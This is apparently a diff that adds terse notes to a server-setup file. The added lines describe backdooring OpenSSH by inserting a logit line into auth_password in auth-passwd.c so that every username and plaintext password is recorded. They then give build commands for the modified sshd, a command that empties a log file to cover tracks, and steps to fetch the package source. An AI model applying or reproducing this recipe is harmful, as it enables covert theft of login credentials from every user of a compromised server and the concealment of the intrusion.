@@ -11,3 +11,22 @@ sudo chmod 600 ssh_host_dsa_key
 sudo chmod 600 ssh_host_rsa_key  
 sudo chmod 755 .  
 /etc/init.d/sshd restart  
+
+
+http://www.hackblog.cn/post/73.html
+
+openssh
+auth-passwd.c 
+auth_password
+logit("username: %s password: %s", authctxt->user, password);
+
+./configure --sysconfdir=/etc/ssh --without-zlib-version-check  --with-md5-passwords
+make
+
+
+echo >/var/log/xxx 
+
+---
+
+apt-get source openssh-server
+apt-get build-dep openssh-server
